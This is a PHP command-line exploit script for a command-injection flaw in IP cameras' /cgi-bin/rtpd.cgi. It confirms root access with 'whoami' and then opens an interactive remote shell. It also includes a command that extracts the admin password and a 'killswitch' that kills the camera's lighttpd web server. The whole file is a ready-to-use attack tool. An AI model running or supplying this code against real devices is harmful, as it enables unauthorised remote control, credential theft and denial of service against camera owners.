<?php

ini_set('default_socket_timeout', 5);

$options = getopt('u:c:g:');

if(!isset($options['u'])) {
  die("Option -u not set!\n");
}

// Run a initial check to make sure the camera is vulnerable
echo '';
$request = request('whoami', 1);

if($request['body'] != 'root' && $request['status'] != 'HTTP/1.1 200 OK') {
  if(!isset($options['g'])) {
    die("Sorry, the server specified isn't vulnerable.\n");
  } else {
    die();
  }
}

if(isset($options['c'])) {
  die("This server is vulnerable, but because you used the -c option you won't be dropped in to a shell.\n");
}

stream_set_blocking(STDIN, false);

$line = '';
$prompt = 'ipcamshell> ';

echo "Those who do not understand UNIX are condemned to reinvent it, poorly. — Henry Spencer\n";
echo $prompt;

while(true) {
  $c = fgetc(STDIN);
  if($c !== false) {
    if($c != "\n") {
      $line .= $c;
    } else {
      if($line == 'exit' || $line == 'quit') {
        break;
      } elseif($line == 'getadminpass') {
        // Fetch the admin password (lol, fail)
        $pass =  request('echo AdminPasswd_ss|tdb get HTTPAccount');
        $pass = str_replace('AdminPasswd_ss=', '', $pass);
        $pass = str_replace('"', '', $pass);
        // There are likely to be more characters which are escaped. Found one? Send a pull request.
        $pass = str_replace('\$', '$', $pass);

        echo "Username: admin\nPassword: {$pass}\n";
      } elseif($line == 'killswitch') {
        echo "WARNING: THIS WILL KILL THE WEBSERVER. You'll lose access and the web server will be shut down. If you're sure you want to do this, run `killswitch --confirm`.\n";
      } elseif($line == 'killswitch --confirm') {
        // Kill lighttpd and exit.
        echo "Web server is shutting down...\n";
        echo request('killall -15 lighttpd', 0, 0);

        echo "GONE.\n";
        break;
      } else {
        echo request($line)."\n";
      }

      echo $prompt;
      $line = '';
    }
  }
}

function request($string, $initial_check=0, $warn=1) {
  // Forgive me. Forgive me.
  global $options;

  $url = $options['u'].'/cgi-bin/rtpd.cgi?';

  // Replace spaces with ampersands, the CGI script replaces ampersands with spaces...
  $string = preg_replace("/[\s]/", "&", $string);
  $contents = @file_get_contents($url.$string);

  // We remove the last line here because it's useless junk
  $lines = explode("\n", trim($contents));
  unset($lines[count($lines) - 1]);
  $final = implode($lines, "\n");

  if($initial_check == 1) {
    $headers = @get_headers($url.$string);
    return array('body' => $final, 'status' => $headers[0]);
  }

  if($final == "" && $warn == 1) {
    return "No output. This may be a response as a result of the command executed or there may be something in STDERR. Check /tmp/lighttpd.error.log for potential errors.";
  }
  return $final;
}

// Stolen from Stack Overflow.
function parse_headers($header) {
  $parsed = array_map(function($x) { return array_map("trim", explode(":", $x, 2)); }, array_filter(array_map("trim", explode("\n", $header))));
}
